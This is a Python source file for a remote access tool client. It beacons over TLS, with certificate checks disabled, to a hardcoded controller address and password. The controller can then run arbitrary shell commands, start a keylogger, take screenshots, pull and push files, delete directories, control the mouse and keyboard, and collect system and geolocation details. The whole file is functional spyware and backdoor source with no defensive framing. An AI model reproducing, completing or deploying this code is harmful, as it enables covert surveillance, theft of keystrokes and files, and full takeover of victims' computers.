import socket
import pickle
import time
import os
import shutil
import shlex
import mss
import subprocess
from pynput import keyboard
import threading
import platform
import psutil
import ssl
import random
import string
import cv2
import numpy as np
import pyautogui as ptg
import requests

class App():
    def __init__(self, hostname, port, password):
        self.hostname = hostname
        self.port = port
        self.password = password
        self.status = "IDLE"
        self.cmd = CMD(self)
        self.data_ = None
        self.id = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(15))
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

    def run(self):
        while True:
            try:
                sock = socket.create_connection((self.hostname, self.port))
                self.socket = self.context.wrap_socket(sock, server_hostname=self.hostname)
                
                time.sleep(0.05)
                self.socket.sendall(self.status.encode())
                data = self.socket.recv(1024).decode()

                if data == "PINGED":
                    self.status = "PINGED"
                    self.socket.send(self.id.encode())
                if data == "SELECTED":
                    self.socket.send(self.password.encode())
                    time.sleep(0.1)
                    self.socket.send(self.id.encode())
                    data = self.socket.recv(1024).decode()
                    if data == "GRANTED":
                        self.status = "SELECTED"
                        self.socket.settimeout(1000)
                        while self.status != "CLOSED":
                            
                            header = self.socket.recv(4096).decode()
                            if header == "CLOSE:CLOSE:CLOSE":
                                data = self.socket.recv(1024).decode()
                                if data == "CLOSE":
                                    self.socket.send(b"CLOSED:len(b'CLOSED'):CLOSED")
                                    self.socket.send(pickle.dumps("CLOSED"))
                                    self.status = "CLOSED"
                                    break
                                    
                            header = header.strip().split(":")
                            
                            type_, size, name = header[0], int(header[1]), header[2]
                            
                            bytes_data = b""
                            while len(bytes_data) < size:
                                packet = self.socket.recv(size - len(bytes_data))
                                if not packet:
                                    raise ConnectionError("connection broken while receiving data")
                                bytes_data += packet
                            data = pickle.loads(bytes_data)
                            
                            header, data = self.gamberge(type_, name, data)
                            
                            if header.split(":")[0] != "IMG":
                                data = pickle.dumps(data)
                            header = header.split(":")
                            header = f"{header[0]}:{len(data)}:{header[1]}"
                            
                            self.socket.send(header.encode())
                            self.socket.sendall(data)
                        

                sock.close()
                self.socket.close()
                self.status = "IDLE"
                
            except ConnectionRefusedError:
                pass
                time.sleep(0.1)
            except Exception as e:
                print(0, e)

    def gamberge(self, type_, name, data_in):
        header = "NONE:NONE"
        data = None
        
        if type(data_in) == type((0, 1)):
            self.data_ = data_in[1]
            data_in = data_in[0]
        
        if type_ == "COMMAND":
            data_in = data_in.replace("\\", "/")
            try:
                
                if data_in.startswith("schedule"):
                    threading.Thread(target=self.schedule, args=(data_in, self.data_, name)).start()
                    header = "TEXT:SCHEDULE"
                    data = "Done"
                else:
                    parts = shlex.split(data_in)
                    command = parts[0]
                    args = parts[1:]
                    
                    handler = self.cmd.get_command(command)
                    if handler:
                        self.cmd.args = args
                        self.cmd.command = data_in
                        self.cmd.type = "TEXT"
                        self.cmd.name = name
                        data, name = handler()
                        header = f"{self.cmd.type}:{name}"
                    else:
                        data = "COMMAND_NOT_VALID"
                        header = "TEXT:NONE"
            except Exception as e:
                data = str(e)
                header = "TEXT:ERROR"
                print(2, e)
        
        elif type_ == "PING":
            header = "PING:"
        
        else:
            data = "TYPE_NOT_VALID"
        
        return header, data
    
    def schedule(self, data, data_, name):
        data_ = data[9:]
        time_ = float(data_[0:data_.find(" ")])
        parts = shlex.split(data_[data_.find(" ") + 1:])
        command = parts[0]
        args = parts[1:]
        
        time.sleep(time_)
        
        handler = self.cmd.get_command(command)
        if handler:
            self.cmd.args = args
            self.cmd.command = data_[data_.find(" ") + 1:]
            self.cmd.type = "TEXT"
            self.cmd.name = name
            data, name = handler()
            data, name = handler()
        
    
class CMD():
    def __init__(self, controller=None):
        self.controller = controller
        self.args = []
        self.type = "TEXT"
        self.name = "NONE"
        self.command = ""
        self.key_listener = None
        self.keys_log = []
        self.keylogger_running = False
        
    def get_command(self, command_name):
        if command_name in ["__init__", "get_command", "on_press", "listen_keys"]:
            return None
        if hasattr(self, command_name):
            return getattr(self, command_name)
        return None
        
    def cd(self):
        os.chdir(self.args[0])
        return "Done", "CHANGE_DIR"
    
    def cwd(self):
        return os.getcwd(), "GET_CURRENT_DIR"
    
    def dir(self):
        if len(self.args) == 0:
            return os.listdir(os.getcwd()), "LIST_DIR"
        else:
            path = os.path.join(os.getcwd(), self.args[0])
            return os.listdir(path), "LIST_DIR"
        
    def rename(self):
        path = os.path.join(os.path.dirname(self.args[0]).replace("\\", "/"), self.args[1].replace("\\", "/")).replace("\\", "/")
        os.rename(self.args[0], path)
        return "Done", "RENAME"
    
    def mkdir(self):
        os.mkdir(self.args[0])
        return "Done", "CREATE_DIR"
    
    def makedirs(self):
        os.makedirs(self.args[0])
        return "Done", "MAKE_DIRS"
    
    def removefile(self):
        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
        os.remove(path)
        return "Done", "REMOVE_FILE"
    
    def removedir(self):
        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
        shutil.rmtree(path)
        return "Done", "REMOVE_DIR"
    
    def ispath(self):
        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
        return os.path.exists(path), "IS_PATH"
    
    def isdir(self):
        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
        return os.path.isdir(path), "IS_DIR"
    
    def getfile(self):
        with open(self.args[0], "rb") as f:
            data = f.read()
        self.type = "FILE"
        return data, os.path.basename(self.args[0])
    
    def sendfile(self):
        with open(self.name, "wb") as f:
            f.write(self.controller.data_)
        return "Done", "SEND_FILE"
    
    def zip(self):
        shutil.make_archive(self.args[0], "zip", os.getcwd().replace("\\", "/") if len(self.args) < 2 else self.args[1])
        return "Done", "ZIP"
    
    def unzip(self):
        time_ = time.time()
        os.mkdir(f"unzipped_{time_}")
        shutil.unpack_archive(self.args[0], f"unzipped_{time_}/" if len(self.args) < 2 else self.args[1])
        return "Done", "UNZIP"
    
    def move(self):
        shutil.move(self.args[0], self.args[1])
        return "Done", "MOVE"
    
    def copyfile(self):
        shutil.copyfile(self.args[0], self.args[1])
        return "Done", "COPY_FILE"
    
    def copydir(self):
        shutil.copytree(self.args[0], self.args[1])
        return "Done", "COPY_DIR"
    
    def screenshot(self):
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            if len(self.args) == 1:
                index = int(self.args[0]) + 1
                if 0 <= index < len(sct.monitors):
                    monitor = sct.monitors[index]

            screenshot = sct.grab(monitor)
            img = np.array(screenshot)
    
            if img is None or img.size == 0:
                return "failed to capture screen", "SCREENSHOT"
    
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            success, img_encoded = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
    
            if not success:
                return "failed to encode image", "SCREENSHOT"
            img_bytes = img_encoded.tobytes()
        
        self.type = "IMG"
        return img_bytes, "SCREENSHOT"
    
    def cmd(self):
        try:
            output = subprocess.check_output(self.command[4:], shell=True, text=True)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        return output, "CMD"
    
    def keylogger(self):
        if self.args[0] == "on" and not self.keylogger_running:
            self.keylogger_running = True
            threading.Thread(target=self.listen_keys, daemon=True).start()
        elif self.args[0] == "off" and self.keylogger_running:
            self.keylogger_running = False
            self.key_listener.stop()
        elif self.args[0] == "clear":
            self.keys_log = []
        elif self.args[0] in ["save", "get"]:
            return self.keys_log, "KEYLOGGER"
        else:
            return "Command not found", "KEYLOGGER"
        return "Done", "KEYLOGGER"
    
    def info(self):
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        ip = requests.get('https://api.ipify.org').text
        geo = requests.get(f'http://ip-api.com/json/{ip}').json()
        infos = {
                " OS : " : platform.system(),
                "OS version : " : platform.version(),
                "Architecture : " : platform.machine(),
                "Processor : " : platform.processor(),
                    
                "CPU cores : " : psutil.cpu_count(logical=True),
                "CPU usage (%) : " : psutil.cpu_percent(interval=1),
                

                "RAM total : " : round(ram.total / (1024 * 1024), 2),
                "RAM used : " : round(ram.used / (1024 * 1024), 2),
                "RAM usage (%) : " : ram.percent,
            
                
                "Disk total (GB) : " : round(disk.total / (1024 ** 3), 2),
                "Disk used (GB) : " : round(disk.used / (1024 ** 3), 2),
                "Disk usage (%) : " : disk.percent,

                "IP : ": ip,
                "City : ": geo.get("city"),
                "Region : ": geo.get("regionName"),
                "Country : ": geo.get("country"),
                "Lattitude : ": geo.get("lat"),
                "Longitude : ": geo.get("lon"),
                "ISP : ": geo.get("isp"),
            }
        
        return infos, "INFO"
    
    def execute(self):
        path = os.path.join(os.getcwd(), self.args[0])
        os.startfile(path)
        return "Done", "EXECUTE"
    
    def print(self):
        print(self.args)
        return "Done", "PRINT"
    
    def mousepos(self):
        return ptg.position(), "MOUSE_POS"
    
    def mouseclick(self):
        def action():
            ptg.click(button=self.args[0] if len(self.args) > 0 else "left", x=int(self.args[1]) if len(self.args) > 1 else None,
                      y=int(self.args[2]) if len(self.args) > 2 else None, clicks=int(self.args[3]) if len(self.args) > 3 else 1,
                      interval=float(self.args[4]) if len(self.args) > 4 else 0.0)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "MOUSE_CLICK"
    
    def mousedown(self):
        ptg.mouseDown(button=self.args[0] if len(self.args) > 0 else "left", x=int(self.args[1]) if len(self.args) > 1 else None, 
                      y=int(self.args[2]) if len(self.args) > 2 else None)
        return "Done", "MOUSE_DOWN"
        
    def mouseup(self):
        ptg.mouseUp(button=self.args[0] if len(self.args) > 0 else "left", x=int(self.args[1]) if len(self.args) > 1 else None, 
                    y=int(self.args[2]) if len(self.args) > 2 else None)
        return "Done", "MOUSE_UP"
    
    def mousedrag(self):
        def action():
            ptg.drag(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0, 
                     button=self.args[3] if len(self.args) > 3 else "left")
        threading.Thread(target=action, daemon=True).start()
        return "Done", "MOUSE_DRAG"
    
    def mousedragto(self):
        def action():
            ptg.dragTo(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0, 
                       button=self.args[3] if len(self.args) > 3 else "left")   
        threading.Thread(target=action, daemon=True).start()
        return "Done", "MOUSE_DRAG_TO"
    
    def mousemove(self):
        def action():
            ptg.move(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "MOUSE_MOVE"
        
    def mousemoveto(self):
        def action():
            ptg.moveTo(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "MOUSE_MOVE_TO"
    
    def write(self):
        def action():
            ptg.write("".join(self.args[0]), interval=float(self.args[2]) if len(self.args) > 2 else 0.0)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "WRITE"
    
    def press(self):
        def action():
            ptg.press(self.args[0], presses=self.args[2] if len(self.args) > 2 else 1, interval=self.args[3] if len(self.args) > 3 else 0.0)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "PRESS"
    
    def hotkey(self):
        ptg.hotkey(self.args)    
        return "Done", "HOTKEY"
    
    def keydown(self):
        ptg.keyDown(self.args[0])
        return "Done", "KEY_DOWN"
        
    def keyup(self):
        ptg.keyUp(self.args[0])
        return "Done", "KEY_UP"
    
    def alert(self):
        def action():
            ptg.alert(self.args[0], self.args[1], timeout=100)
        threading.Thread(target=action, daemon=True).start()
        return "Done", "ALERT"
    
    def screensize(self):
        return ptg.size(), "SCREEN_SIZE"
    
    def close(self):
        self.controller.status = "CLOSED"
        return "Done", "CLOSE"
    
    def on_press(self, key):
        try:
            self.keys_log.append(key.char)
        except:
            self.keys_log.append(f"[{key.name}]")
    
    def listen_keys(self):
        self.key_listener = keyboard.Listener(on_press=self.on_press)
        self.key_listener.start()
    
    
if __name__ == "__main__":
    ptg.FAILSAFE = False
    app = App("192.168.1.19", 55277, "Id6-DIjjf032_ddo") #server ip address, port(must be same as server), password(must be same as server)
    app.run()
